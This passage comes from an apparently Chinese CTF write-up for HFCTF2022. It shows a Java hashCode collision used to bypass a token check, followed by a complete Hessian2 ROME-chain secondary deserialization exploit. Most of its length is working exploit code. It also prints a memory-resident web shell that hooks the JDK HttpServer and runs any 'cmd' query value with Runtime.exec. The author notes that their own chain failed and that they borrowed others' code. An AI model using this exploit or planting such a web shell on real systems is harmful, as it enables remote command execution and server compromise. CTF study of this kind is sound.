+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">31*h1 + a[i] = 31*h2 = b[j]</span><br><span class="line"> </span><br><span class="line">(h1-h2)*31 = b[j]-a[i]</span><br></pre></td></tr></table></figure>
+<p>假如有字符串<code>aa</code>，我们能够很容易计算出与之hash相等的另一字符串<code>bB</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//bB</span><br><span class="line">31*97 + 97 = 31*(97+1) + 97-31 = 31*98 + 66 = 3104</span><br></pre></td></tr></table></figure>
+<p>后续字符串的hash也相等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//true</span><br><span class="line">System.out.println(&quot;bBDDD&quot;.hashCode()==&quot;aaDDD&quot;.hashCode());</span><br></pre></td></tr></table></figure>
+<p>因此本题想要构造出与HFCTF2022的hash相等的另一字符串，我们只需要找到与字符HF的hash相等的字符即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//HF=Ge</span><br><span class="line">72*31+70 = 71*31+101</span><br></pre></td></tr></table></figure>
+<p>所以可以用<strong>GeCTF2022</strong>绕过检测</p>
+<p><img src="../images/image123434334.png" alt="image123434334" /></p>
+<h3 id="法二"><a class="markdownIt-Anchor" href="#法二"></a> 法二</h3>
+<p>在hashCode生成代码中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设需要使得两个长度为9的字符串的hashcode相等，可以让前7个字符完全相同，剩下两个字符满足31a+b=31x+y即可，写代码生成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hashcode_colli</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">alphebat</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>; c &lt;= <span class="string">&#x27;Z&#x27;</span>; c++) &#123;</span><br><span class="line">            alphebat += c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>; c &lt;= <span class="string">&#x27;z&#x27;</span>; c++) &#123;</span><br><span class="line">            alphebat += c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&#x27;0&#x27;</span>; c &lt;= <span class="string">&#x27;9&#x27;</span>; c++) &#123;</span><br><span class="line">            alphebat += c;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;HFCTF2022&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; alphebat.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; alphebat.length(); j++) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="string">&quot;HFCTF20&quot;</span>; <span class="comment">//:Y1\&quot;nOJF-6A&#x27;&gt;|r-     HFCTF201Q</span></span><br><span class="line">                token+=alphebat.charAt(i);</span><br><span class="line">                token+=alphebat.charAt(j);</span><br><span class="line">                <span class="keyword">if</span> (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">                    System.out.println(token);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到<strong>HFCTF201Q</strong>和<strong>HFCTF200p</strong>两个可用的token</p>
+<p>这里用HFCTF200p绕过检测</p>
+<p><img src="../images/image123513031.png" alt="imag123513031" /></p>
+<p>现在就可以进行反序列化利用了</p>
+<h2 id="hessian2二次反序列化"><a class="markdownIt-Anchor" href="#hessian2二次反序列化"></a> Hessian2二次反序列化</h2>
+<p>Hessian2反序列化打ROME链的二次反序列化链我们之前也写过，这里直接拿过来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(org.example.runtime.class.getName()).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> (TemplatesImpl) getTemplates(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;114514&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//二次反序列化</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> second_serialize(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean2);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> makeMap(equalsBean2,<span class="string">&quot;114514&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = Hessian2_serialize(hashMap2);</span><br><span class="line">        Hessian2_unserialize(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//写法固定，用于初始化SignedObject</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SignedObject <span class="title function_">second_serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> signedObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Infernity&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hessian依赖的序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flush();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hessian依赖的反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的org.example.runtime是用来本地测试弹计算器的：</p>
+<p><img src="../images/image124414206.png" alt="image124414206" /></p>
+<p>成功</p>
+<p>但是题目不出网，没有回显，所以关键就是如何在Java原生中间件HttpServer写入内存马，获取回显</p>
+<h2 id="构造内存马"><a class="markdownIt-Anchor" href="#构造内存马"></a> 构造内存马</h2>
+<p>内存马还没学，看不懂，这里借用大佬的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hessian2;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_Handler</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//获取当前线程</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">groupField</span> <span class="operator">=</span> o.getClass().getDeclaredField(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">            groupField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">group</span> <span class="operator">=</span> groupField.get(o);</span><br><span class="line"> </span><br><span class="line">            <span class="type">Field</span> <span class="variable">threadsField</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threadsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">t</span> <span class="operator">=</span> threadsField.get(group);</span><br><span class="line"> </span><br><span class="line">            Thread[] threads = (Thread[]) t;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads)&#123;</span><br><span class="line">                <span class="keyword">if</span>(thread.getName().equals(<span class="string">&quot;Thread-2&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">targetField</span> <span class="operator">=</span> thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    targetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> targetField.get(thread);</span><br><span class="line"> </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">thisField</span> <span class="operator">=</span> target.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    thisField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">this$0</span> <span class="operator">=</span> thisField.get(target);</span><br><span class="line"> </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">contextsField</span> <span class="operator">=</span> <span class="built_in">this</span>$<span class="number">0.</span>getClass().getDeclaredField(<span class="string">&quot;contexts&quot;</span>);</span><br><span class="line">                    contextsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">contexts</span> <span class="operator">=</span> contextsField.get(<span class="built_in">this</span>$<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">listField</span> <span class="operator">=</span> contexts.getClass().getDeclaredField(<span class="string">&quot;list&quot;</span>);</span><br><span class="line">                    listField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">lists</span> <span class="operator">=</span> listField.get(contexts);</span><br><span class="line">                    java.util.<span class="type">LinkedList</span> <span class="variable">linkedList</span> <span class="operator">=</span> (java.util.LinkedList) lists;</span><br><span class="line"> </span><br><span class="line">                    <span class="type">Object</span> <span class="variable">list</span> <span class="operator">=</span> linkedList.get(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">handlerField</span> <span class="operator">=</span> list.getClass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    handlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    handlerField.set(list,<span class="keyword">new</span> <span class="title class_">shell_Handler</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">resp</span> <span class="operator">=</span> <span class="string">&quot;Success!\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> httpExchange.getRequestURI().getQuery();</span><br><span class="line">        String[] entry = query.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(entry[<span class="number">0</span>].equals(<span class="string">&quot;cmd&quot;</span>))&#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(entry[<span class="number">1</span>]).getInputStream();</span><br><span class="line">            bao = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(-<span class="number">1</span> != (n = inputStream.read(bytes)))&#123;</span><br><span class="line">                bao.write(bytes,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resp += <span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray());</span><br><span class="line">        httpExchange.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)resp.length());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> httpExchange.getResponseBody();</span><br><span class="line">        os.write(resp.getBytes());</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h2>
+<p>但我发现我那个Hessian2二次反序列化的POC传上去之后并没有触发内存马</p>
+<p>这里还是用大佬的吧…</p>
